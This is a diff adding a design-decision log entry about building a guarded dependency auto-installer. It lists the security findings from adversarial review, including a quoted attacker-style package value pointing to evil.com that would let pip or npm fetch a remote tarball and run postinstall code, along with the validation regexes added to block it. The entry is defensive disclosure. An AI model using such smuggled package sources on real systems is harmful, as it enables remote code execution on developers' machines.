@@ -1063,3 +1063,36 @@ Locked decisions. Format: ID · decision · why. Never silently reverse — supe
   `specs/multi-model-orchestration/{DESIGN,PLAN}.md`. **Meta:** the three adversarial passes each caught a real
   defect the deterministic gate structurally misses (incl. the verify-before-reuse guard biting my own phantom
   citation) — the D98/D102 discipline working as designed.
+
+<!-- kata-preflight BUILT — the PRE-FLIGHT spine phase. Spec: specs/kata-preflight/{GRILL-LEDGER,DESIGN,PLAN}.md.
+     Merge 710347a. Clears the 2nd of Debug Mode's two build blockers (install-portability cleared the 1st). -->
+- **D109 — kata-preflight BUILT: the PRE-FLIGHT spine phase (D29 realized) — 2026-06-26, merge `710347a`.**
+  Grilled in plain terms ([[grill-in-plain-terms]]) → 4 operator decisions (PF-1 auto-run pre-approved installs ·
+  PF-2 full v1 incl. the reference-counted cleanup report · PF-3 one mechanism for build-deps AND a target's
+  runnable env · PF-4 sandbox-when-available-else-host+warn) on top of the pre-locked D29 + D-registry +
+  `protocol/dependencies.md`. Built through the recipe: **freeze-gate `kata-review` HOLD→SHIP** (caught a
+  command-injection BLOCKER — freeform-shell-string execution — + 3 MAJORs; fixed: structured argv, sandbox
+  hard-block, host-install→degraded, D29 reconciliation + manifest approval-hash) → orchestrated 3-slice build
+  (concurrent Sonnet workers, TDD, mutation-proven) → `kata-evaluate` **PASS 9/9** (executed every seam live) →
+  **D98 red-team HOLD→SHIP** — **the red-team caught a real untrusted-source RCE path** the evaluator missed:
+  `package="https://evil.com/m.tgz"` / `git+https://…` was a *positional source* pip/npm fetch **ignoring** the
+  forced registry → postinstall → RCE. Fixed: **per-manager package-NAME grammar** (`_validate_package`; pip/uv
+  `^[A-Za-z0-9._-]+(\[…\])?$`, npm `^(@scope/)?name$`, cargo `^[A-Za-z0-9_-]+$`; universal reject of `://`,
+  leading `git+`/`http`/`.`/`/`, `..`) so **no package value can express a URL/VCS/tarball/path source for any
+  manager**; + MAJOR-2 (approval artifact out of gitignored `.kata/` → committable repo-root path; tamper-claims
+  downgraded to honest drift-detection) + MINOR-3 (Snyk SCA gate fail-**closed** when `scan_required` + no scanner
+  wired). **What now exists:** `tools/kata_preflight.py` (guarded auto-installer — structured argv from a fixed
+  `manager`→builder table, never `shell=True`, freeform `install` string **never executed**; forced trusted
+  registry; Snyk SCA pre-install; manifest-hash drift gate; machine-global `~/.kata/installed-registry.json` +
+  reference-counted cleanup recommendation, **never auto-uninstall**; target `baselineGate` runnable-env probe →
+  `degrade` verdict; `preflight_required`/`gate_status` helpers) · the new spine skill `kata-preflight`
+  (`coordinate`, `kata/spine`, never tiered) · `kata-orchestrate` **conditional fail-closed** PRE-FLIGHT
+  precondition (no manifest ⇒ today's loop, BC; manifest + missing/blocked/unaccepted preflight.json ⇒ refuse) ·
+  structured fields in `protocol/dependencies.md` · enumerate→manifest pointers in grill/design-doc/plan.
+  **Gates:** pytest **633** (+21), validate **37/0** (36→37 skills), Snyk **0 med+**, mutation `allNonVacuous`.
+  **Honest scope:** auto-install is **stub-tested** (injectable argv runner — no real machine mutation in tests);
+  a real install runs only behind freeze-approved-manifest + hash + Snyk + sandbox guards; workers never install
+  (least-privilege). **Clears the SECOND of Debug Mode's two build blockers (install-portability was the first,
+  D104/D103) → Debug Mode is now UNBLOCKED.** Backout tag `pre-kata-preflight`. Records:
+  `specs/kata-preflight/{GRILL-LEDGER,DESIGN,PLAN}.md`. **Meta:** D98 again caught what the conformance gate
+  could not — the adversarial second lens is load-bearing on security-critical code (D98 working exactly as designed).
